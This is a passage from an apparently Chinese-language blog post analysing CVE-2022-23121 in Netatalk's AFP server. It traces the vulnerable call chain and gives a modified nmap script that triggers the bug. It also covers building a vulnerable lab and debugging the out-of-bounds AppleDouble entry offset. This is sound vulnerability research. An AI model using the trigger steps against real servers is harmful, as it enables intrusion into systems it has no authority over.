&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AFP_AFPFUNC_START(function, (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)AfpNum2name(function));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> err &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>afp_switch[function])(obj,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)dsi&lt;span style="color:#f92672">-&amp;gt;&lt;/span>commands, dsi&lt;span style="color:#f92672">-&amp;gt;&lt;/span>cmdlen,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>dsi&lt;span style="color:#f92672">-&amp;gt;&lt;/span>data, &lt;span style="color:#f92672">&amp;amp;&lt;/span>dsi&lt;span style="color:#f92672">-&amp;gt;&lt;/span>datalen);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* error */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> afp_dsi_die(EXITERR_CLNT);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>afp_switch&lt;/code>被&lt;code>preauth_switch&lt;/code>初始化，里面只有少量函数指针，而在&lt;code>postauth_switch&lt;/code>中含有大量函数指针，推测为经过身份验证后&lt;code>afp_switch&lt;/code>被&lt;code>postauth_switch&lt;/code>赋值&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">static&lt;/span> AFPCmd preauth_switch[] &lt;span style="color:#f92672">=&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> NULL, NULL, NULL, NULL,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> NULL, NULL, NULL, NULL, &lt;span style="color:#75715e">/* 0 - 7 */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> NULL, NULL, NULL, NULL,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> NULL, NULL, NULL, NULL, &lt;span style="color:#75715e">/* 8 - 15 */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> NULL, NULL, afp_login, afp_logincont,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> afp_logout, NULL, NULL, NULL, &lt;span style="color:#75715e">/* 16 - 23 */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>AFPCmd &lt;span style="color:#f92672">*&lt;/span>afp_switch &lt;span style="color:#f92672">=&lt;/span> preauth_switch;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>AFPCmd postauth_switch[] &lt;span style="color:#f92672">=&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> NULL, afp_bytelock, afp_closevol, afp_closedir,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> afp_closefork, afp_copyfile, afp_createdir, afp_createfile, &lt;span style="color:#75715e">/* 0 - 7 */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> afp_delete, afp_enumerate, afp_flush, afp_flushfork,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> afp_null, afp_null, afp_getforkparams, afp_getsrvrinfo, &lt;span style="color:#75715e">/* 8 - 15 */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> afp_getsrvrparms, afp_getvolparams, afp_login, afp_logincont,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> afp_logout, afp_mapid, afp_mapname, afp_moveandrename, &lt;span style="color:#75715e">/* 16 - 23 */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> afp_openvol, afp_opendir, afp_openfork, afp_read,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> afp_rename, afp_setdirparams, afp_setfilparams, afp_setforkparams,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* 24 - 31 */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> afp_setvolparams, afp_write, afp_getfildirparams, afp_setfildirparams,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> afp_changepw, afp_getuserinfo, afp_getsrvrmesg, afp_createid, &lt;span style="color:#75715e">/* 32 - 39 */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> afp_deleteid, afp_resolveid, afp_exchangefiles, afp_catsearch,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> afp_null, afp_null, afp_null, afp_null, &lt;span style="color:#75715e">/* 40 - 47 */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> afp_opendt, afp_closedt, afp_null, afp_geticon,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> afp_geticoninfo, afp_addappl, afp_rmvappl, afp_getappl, &lt;span style="color:#75715e">/* 48 - 55 */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> afp_addcomment, afp_rmvcomment, afp_getcomment, NULL,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">set_auth_switch&lt;/span>(&lt;span style="color:#66d9ef">const&lt;/span> AFPObj &lt;span style="color:#f92672">*&lt;/span>obj, &lt;span style="color:#66d9ef">int&lt;/span> expired)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> afp_switch &lt;span style="color:#f92672">=&lt;/span> postauth_switch;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在函数调用链中，&lt;code>afp_openfork&lt;/code>在&lt;code>afp_switch&lt;/code>的下标为26，同时26也可以在AFP数据包内看到：&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/6.png" />&lt;/p>
&lt;p>&lt;strong>调用总结&lt;/strong>&lt;/p>
&lt;p>总结以上触发流程，触发到&lt;code>afp_openfork&lt;/code>函数需要AFP数据包内&lt;code>Command&lt;/code>字段值为26同时需要设置&lt;code>ADFLAGS_RF&lt;/code> 这个&lt;code>flag&lt;/code>，触发漏洞链条为：&lt;code>afp_openfork-&amp;gt;ad_open→ad_open_rf→ad_open_rf_ea→ad_header_read_osx→parse_entries&lt;/code>。&lt;/p>
&lt;p>函数调用图如下：&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/7.png" />&lt;/p>
&lt;p>&lt;strong>如何发送FPOpenFork请求&lt;/strong>&lt;/p>
&lt;p>前面说过在nmap中含有afp相关的脚本，在nmap自带的lua库afp.lua中含有读取文件相关的函数，调用之，最终nse脚本如下，需要注意的是，在&lt;strong>FPOpenFork&lt;/strong>请求中必须设置&lt;code>ADFLAGS_RF&lt;/code> 这个flag才会触发到漏洞函数逻辑，在nmap自带的afp.lua的&lt;code>ReadFile&lt;/code>函数中，该flag写死为0，需要修改为0x2，请求中的&lt;code>ADFLAGS_RF&lt;/code> 才会被设置。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>action &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span>&lt;span style="color:#f92672">(&lt;/span>host, port&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-- 和afp-ls逻辑一样
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> local str_path &lt;span style="color:#f92672">=&lt;/span> args&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#34;path&amp;#34;&lt;/span>&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> local content
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> status, content &lt;span style="color:#f92672">=&lt;/span> afpHelper:ReadFile&lt;span style="color:#f92672">(&lt;/span>str_path&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> status, response &lt;span style="color:#f92672">=&lt;/span> afpHelper:Logout&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> status, response &lt;span style="color:#f92672">=&lt;/span> afpHelper:CloseSession&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> content
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> end
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>end
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/8.png" />&lt;/p>
&lt;p>&lt;strong>文件内应该包含什么&lt;/strong>&lt;/p>
&lt;p>在函数调用链中的&lt;code>ad_header_read_osx&lt;/code> 函数中，有备注*&lt;code>Read an ._ file, only uses the resofork, finderinfo is taken from EA&lt;/code> ，该函数只会使用&lt;code>resofork&lt;/code> 和&lt;code>finderinfo&lt;/code> 这两种entry，*所以在生成触发该漏洞的文件时只需要包含这两种entry即可。&lt;/p>
&lt;h2 id="环境搭建">环境搭建&lt;/h2>
&lt;p>这里使用Netatalk 3.1.11版本搭建&lt;/p>
&lt;ul>
&lt;li>
&lt;p>系统版本 Ubuntu 1804&lt;/p>
&lt;/li>
&lt;li>
&lt;p>内核版本&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>root@ubuntu:~/nettatalk/netatalk-3.1.11/build/sbin/genefile# uname -a
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Linux ubuntu 5.13.0-40-generic &lt;span style="color:#75715e">#45~20.04.1-Ubuntu SMP Mon Apr 4 09:38:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>libc版本 libc-2.31.so&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Netatalk编译&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>apt-get install -y libdb-dev libgcrypt-dev libcrack2-dev libgssapi-krb5-2 libgssapi3-heimdal libgssapi-perl libkrb5-dev libtdb-dev libevent-dev libdb-dev
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wget https://versaweb.dl.sourceforge.net/project/netatalk/netatalk/3.1.11/netatalk-3.1.11.tar.bz2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>tar -xjf netatalk-3.1.11.tar.bz2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cd netatalk-3.1.11.tar.bz2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mkdir build
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>export CFLAGS&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;-g -O0&amp;#39;&lt;/span> &lt;span style="color:#75715e"># 保留调试符号，方便调试&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>./configure &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span>--with-init-style&lt;span style="color:#f92672">=&lt;/span>debian-systemd &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span>--without-libevent &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span>--without-tdb &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span>--with-cracklib &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span>--enable-krbV-uam &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span>--enable-debug &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span>--with-pam-confdir&lt;span style="color:#f92672">=&lt;/span>/etc/pam.d &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span>--with-dbus-daemon&lt;span style="color:#f92672">=&lt;/span>/usr/bin/dbus-daemon &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span>--with-dbus-sysconf-dir&lt;span style="color:#f92672">=&lt;/span>/etc/dbus-1/system.d &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span>--with-tracker-pkgconfig-version&lt;span style="color:#f92672">=&lt;/span>1.0 &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span>--prefix&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">`&lt;/span>pwd&lt;span style="color:#e6db74">`&lt;/span>/build &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span>--bindir&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">`&lt;/span>pwd&lt;span style="color:#e6db74">`&lt;/span>/build/bin &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span>--sbindir&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">`&lt;/span>pwd&lt;span style="color:#e6db74">`&lt;/span>/build/sbin
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>make
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>make install
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>Netatalk配置&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>mkdir /tmp/afp_tmp/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mkdir /tmp/afp_tmp/Public
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mkdir /tmp/afp_tmp/test
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>echo test &amp;gt; /tmp/afp_tmp/test/test.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>echo hello &amp;gt; /tmp/afp_tmp//Public/hello.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chmod &lt;span style="color:#ae81ff">777&lt;/span> -R /tmp/afp_tmp/Public /tmp/afp_tmp/test
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>/tmp/afp_tmp/afp.conf:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span> Global &lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>uam list &lt;span style="color:#f92672">=&lt;/span> uams_guest.so,uams_clrtxt.so,uams_dhx2.so
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>save password &lt;span style="color:#f92672">=&lt;/span> no
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>unix charset &lt;span style="color:#f92672">=&lt;/span> UTF8
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>use sendfile &lt;span style="color:#f92672">=&lt;/span> yes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>zeroconf &lt;span style="color:#f92672">=&lt;/span> no
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>guest account &lt;span style="color:#f92672">=&lt;/span> nobody
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span> Public &lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>path &lt;span style="color:#f92672">=&lt;/span>/tmp/afp_tmp/Public
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ea &lt;span style="color:#f92672">=&lt;/span> auto
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>convert appledouble &lt;span style="color:#f92672">=&lt;/span> no
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>stat vol &lt;span style="color:#f92672">=&lt;/span> no
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>file perm &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">777&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>directory perm &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">777&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>veto files &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/Network Trash Folder/.!@#$recycle/.systemfile/lost+found/Nas_Prog/.!@$mmc/&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>rwlist &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;admin&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;nobody&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;@allaccount&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>valid users &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;admin&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;nobody&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;@allaccount&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>invalid users &lt;span style="color:#f92672">=&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span> test &lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>path &lt;span style="color:#f92672">=&lt;/span> /tmp/afp_tmp/test
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ea &lt;span style="color:#f92672">=&lt;/span> auto
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>convert appledouble &lt;span style="color:#f92672">=&lt;/span> no
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>stat vol &lt;span style="color:#f92672">=&lt;/span> no
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>file perm &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">777&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>directory perm &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">777&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>veto files &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/Network Trash Folder/.!@#$recycle/.systemfile/lost+found/Nas_Prog/.!@$mmc/&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>rwlist &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;admin&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;nobody&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;@allaccount&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>valid users &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;admin&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;nobody&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;@allaccount&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>invalid users &lt;span style="color:#f92672">=&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>参考：&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://nosec.org/home/detail/4997.html" target="_blank">https://nosec.org/home/detail/4997.html&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;h2 id="调试">调试&lt;/h2>
&lt;p>在AFPD中，由子进程负责处理AFP请求，父进程则循环接受客户端的请求，所以这里只需要调试子进程即可，为了方便调试，编写了如下脚本，至于为什么设置条件断点&lt;code>b ad_open.c:1894 if adflags &amp;amp; 2 != 0&lt;/code> 在后文说明。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>t.sh
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gdb -x debug.gdb attach &lt;span style="color:#e6db74">`&lt;/span>ps -ef | grep afpd | grep -v grep | grep -v cnid |awk &lt;span style="color:#e6db74">&amp;#39;{print $2}&amp;#39;&lt;/span> | head -1&lt;span style="color:#e6db74">`&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>debug.gdb
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set follow-fork-mode child
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set detach-on-fork off
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set schedule-multiple on
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>b ad_open.c:1894 &lt;span style="color:#66d9ef">if&lt;/span> adflags &amp;amp; &lt;span style="color:#ae81ff">2&lt;/span> !&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>b ad_open.c:617
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>b ad_open.c:605
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>启动AFPD服务&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>./afpd -d -F /tmp/afp_tmp/afpd.conf
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>./cnid_metad -d -F /tmp/afp_tmp/afpd.conf
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="为什么要设置条件断点">&lt;strong>为什么要设置条件断点&lt;/strong>&lt;/h3>
&lt;p>将前面生成的appledouble文件通过nmap脚本上传到afp服务器，通过nmap脚本请求该文件触发该漏洞&lt;/p>
&lt;p>如果断点没有设置&lt;code>if adflags &amp;amp; 2 != 0&lt;/code> 这个条件则gdb会直接断在&lt;code>ad_open.c:1894&lt;/code>，此时请求内&lt;code>ADFLAGS_RF&lt;/code> 值为0，不能进入漏洞逻辑，而由于断点，afp无法及时回复nmap数据包，nmap会报超时。&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/9.png" />&lt;/p>
&lt;p>继续执行的话，afpd会收到&lt;code>SIGALRM&lt;/code>信号，无法进入漏洞逻辑&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/10.png" />&lt;/p>
&lt;h3 id="正常调试">&lt;strong>正常调试&lt;/strong>&lt;/h3>
&lt;p>上传的._read文件到test目录：&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/11.png" />&lt;/p>
&lt;p>触发漏洞，进入&lt;code>parse_entries&lt;/code>函数内，&lt;code>parse_entries&lt;/code>读取buf里面的数据到ad指向的&lt;code>adouble&lt;/code>结构体中。&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/12.png" />&lt;/p>
&lt;p>最终adouble结构体内entry成员变量被设置为如下值，可以看出finderinfo entry内的off已经越界了：&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/13.png" />&lt;/p>
&lt;p>而正常appledouble文件内，每个&lt;code>entry.ade_off+entry.ad_len&lt;/code>相加应该小于文件大小，在上图中第九个entry即finderinfo的entry.ade_off+entry.ad_len = A27 &amp;gt;文件大小，这个偏移也可以从文件内体现，此时finderinfo的off已越界，此时已经控制了&lt;code>adouble.entry.off&lt;/code>。&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/14.png" />&lt;/p>
&lt;h3 id="如何利用entry内的越界">如何利用entry内的越界&lt;/h3>
&lt;p>前面写到，&lt;code>parse_entries&lt;/code>函数可以将adouble结构体内的entry的off和len相加大于文件大小，如果某个地方读取了这个off和len并作为offset读写数据则可能产生越界读写。&lt;/p>
&lt;p>继续看ad_header_read_osx调用&lt;code>parse_entries&lt;/code>之后的逻辑，在&lt;code>parse_entries&lt;/code>中如果程序发现off+len越界则会返回-1，如果ad指向的adouble结构体内的&lt;code>finderinfo entry&lt;/code>的&lt;code>ade_len&lt;/code>不等于32则进入if逻辑内，调用到&lt;code>ad_convert_osx&lt;/code>函数。&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/15.png" />&lt;/p>
